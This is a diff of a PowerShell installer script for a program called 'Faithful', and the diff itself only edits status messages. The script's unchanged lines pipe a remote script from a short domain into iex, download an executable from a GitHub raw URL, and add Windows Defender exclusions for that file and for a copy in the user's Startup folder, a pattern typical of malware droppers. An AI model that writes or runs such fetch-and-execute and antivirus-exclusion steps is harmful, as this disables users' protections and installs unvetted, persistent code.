@@ -3,11 +3,11 @@
 # iwr a.faithful.cf | iex
 
 Write-Output "The Faithful script was recently updated, and this administrator script was re-added."
-Write-Output "[LAST UPDATE]: 23/4/2022 6:10 PM"
+Write-Output "[LAST UPDATE]: 23/4/2022 6:20 PM"
 Write-Output "(INFO) Starting download..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "XFaithful.exe"
 Write-Output "(INFO) Executable downloaded"
-Write-Output "Adding exclusions for Windows defender..."
+Write-Output "(INFO) Adding exclusions for Windows defender..."
 Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\XFaithful.exe"
 Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XFaithful.exe"
 Write-Output "(INFO) Exclusions added. If the above two commands failed, you need to add Faithful as an exclusion manually so that the program continues to work."
